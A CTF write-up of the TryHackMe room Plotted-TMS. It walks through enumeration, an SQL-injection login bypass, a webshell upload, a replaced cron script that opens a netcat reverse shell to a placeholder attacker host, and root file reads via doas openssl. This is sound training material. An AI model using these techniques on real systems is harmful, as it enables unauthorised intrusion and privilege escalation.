---
title: "Plotted-TMS"
date: 2025-02-12
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Plotted-TMS
categories: [TryHackMe, Easy]
tags: [linux, web, enumeration, sqli, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Plotted-TMS</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Everything here is plotted!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/plottedtms">https://tryhackme.com/room/plottedtms</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Plotted-TMS.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.118.160
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 12:50 EST
  Nmap scan report for 10.10.118.160
  Host is up (0.041s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  445/tcp open  microsoft-ds

  Nmap done: 1 IP address (1 host up) scanned in 36.95 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,445 10.10.118.160
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 12:51 EST
  Nmap scan report for 10.10.118.160
  Host is up (0.039s latency).

  PORT    STATE SERVICE VERSION
  22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
  |   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
  |_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
  80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Host script results:
  |_smb2-time: Protocol negotiation failed (SMB2)

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 50.11 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The port provided an `Apache2` default site too. Nothing in the source code, so I started a gobuster directory enumeration:
```bash
$ gobuster dir --url http://10.10.118.160/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.118.160/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /admin                (Status: 301) [Size: 314] [--> http://10.10.118.160/admin/]
  /shadow               (Status: 200) [Size: 25]
  /passwd               (Status: 200) [Size: 25]
```

### /shadow Analysis

The subdirectory provided a string which seems to be base64 encoded.
```bash
$ echo "bm90IHRoaXMgZWFzeSA6RA==" | base64 -d             
not this easy :D
```

### /passwd Analysis

The subdirectory provided a string which seems to be base64 encoded.
```bash
$ echo "bm90IHRoaXMgZWFzeSA6RA==" | base64 -d             
not this easy :D
```

### /admin Analysis

The admin directory seems to give us a private key, but again nothing: 
```bash
$ echo "VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE" | base64 -d
Trust me it is not this easy..now get back to enumeration :D 
```

I didn't find anything useful and proceeded with the next port.

## Port 445 Analysis
Even if the `nmap` output shows that there is no Samba server, I tried enumerate SMB shares. But didn't get any results. Therefore I continued and found an `Apache2` default site. Nothing in the source code, so I started a gobuster directory enumeration:
```bash
$ gobuster dir --url http://10.10.118.160:445/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.118.160:445/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /management           (Status: 301) [Size: 324] [--> http://10.10.118.160:445/management/]
```

### /management Analysis
The subdirectory showed an `Traffic Offense Management System`: 

![TOMS](/assets/img/tryhackme/Plottedtms/thm_plottedtms_1.jpg)

After analysing the website I collected the following:
```text
Tommy Lasorda
Copyright © TOMS 2021
Developed By: oretnom23
Application login
```

To enumerate the application another directory enumeration was performed:
```bash
$ gobuster dir --url http://10.10.118.160:445/management --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.118.160:445/management
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /uploads              (Status: 301) [Size: 332] [--> http://10.10.118.160:445/management/uploads/]
  /pages                (Status: 301) [Size: 330] [--> http://10.10.118.160:445/management/pages/]
  /admin                (Status: 301) [Size: 330] [--> http://10.10.118.160:445/management/admin/]
  /assets               (Status: 301) [Size: 331] [--> http://10.10.118.160:445/management/assets/]
  /plugins              (Status: 301) [Size: 332] [--> http://10.10.118.160:445/management/plugins/]
  /database             (Status: 301) [Size: 333] [--> http://10.10.118.160:445/management/database/]
  /classes              (Status: 301) [Size: 332] [--> http://10.10.118.160:445/management/classes/]
  /dist                 (Status: 301) [Size: 329] [--> http://10.10.118.160:445/management/dist/]
  /inc                  (Status: 301) [Size: 328] [--> http://10.10.118.160:445/management/inc/]
  /build                (Status: 301) [Size: 330] [--> http://10.10.118.160:445/management/build/]
  /libs                 (Status: 301) [Size: 329] [--> http://10.10.118.160:445/management/libs/]
```
I proceeded with the analysis of the subdirectories.

### /management/database
The directory provided me a `sql` file which give me the following hints:
```text
phpMyAdmin SQL Dump -- version 5.1.1
Host: 127.0.0.1
PHP Version: 8.0.7
Database: `traffic_offense_db`
[... reduced for readability...]
--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `firstname`, `lastname`, `username`, `password`, `avatar`, `last_login`, `type`, `date_added`, `date_updated`) VALUES
(1, 'Adminstrator', 'Admin', 'admin', '0192023a7bbd73250516f069df18b500', 'uploads/1624240500_avatar.png', NULL, 1, '2021-01-20 14:02:37', '2021-06-21 09:55:07'),
(9, 'John', 'Smith', 'jsmith', '1254737c076cf867dc53d60a0364f38e', 'uploads/1629336240_avatar.jpg', NULL, 2, '2021-08-19 09:24:25', NULL);

```

This gives us the administrator username. When trying the password the response looks like this:
```json
{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('admin123') "}
```

After playing around with some SQL-Injection techniques by inserting for username `admin'#` I got this:
```html
{"status":"success"}
```

The admin page of the Traffic Offense Management System appeared:

![Admin page of TOMS](/assets/img/tryhackme/Plottedtms/thm_plottedtms_2.jpg)

I analyzed the website for ways to proceed and found that the user can upload an avatar. Let's upload a php webshell:

![php reverse shell upload](/assets/img/tryhackme/Plottedtms/thm_plottedtms_3.jpg)

Looks great, we have initial access.

## Privilege Escalation plot_admin

I searched for a way to get `plot_admin` and found an intersting cronjob:
```bash
* *     * * *   plot_admin /var/www/scripts/backup.sh
```

The `backup.sh` belongs to the user plot_admin so I wasn't able to edit it. But the folder belongs to `www-data` which means we can delete and create files. The new `backup.sh` looks like this:
```bash
#!/bin/bash

busybox nc [attackerip] 9005 -e sh
```
and gave it all permissions:

```bash
chmod 777 backup.sh
```

After one minute the listener on port `9005` caught the connection:
```bash
lot_admin@plotted:~$ cat user.txt 
[removed]
```

## Privilege Escalation root

Because I didn't find the password of the user or something useful by hand I started the linepeas script.

```bash
╔══════════╣ Checking doas.conf
permit nopass plot_admin as root cmd openssl  
```

A quick search in <a href="https://gtfobins.github.io/gtfobins/openssl/#file-read">gftobins</a> gave me all I needed:
```bash
plot_admin@plotted:~$ doas -u root openssl enc -in /root/root.txt
Congratulations on completing this room!

[removed]

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```

solved! :)
